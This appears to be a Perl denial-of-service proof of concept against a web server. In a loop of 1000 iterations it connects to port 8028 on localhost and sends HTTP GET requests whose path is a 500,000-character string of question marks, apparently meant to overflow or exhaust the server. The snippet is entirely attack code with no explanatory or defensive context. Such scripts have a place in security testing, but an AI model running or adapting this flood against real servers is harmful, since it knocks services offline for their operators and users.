$data = "?" x 500000;

for($i= 0; $i < 1000; $i++)
{
	$sock= new IO::Socket::INET( PeerAddr => "localhost",
	PeerPort => 8028,

	Proto => 'tcp',
	Type => SOCK_STREAM, 

	);
	
	print $sock "GET /$data HTTP/1.0\r\n\r\n";
	
	close($sock);
}

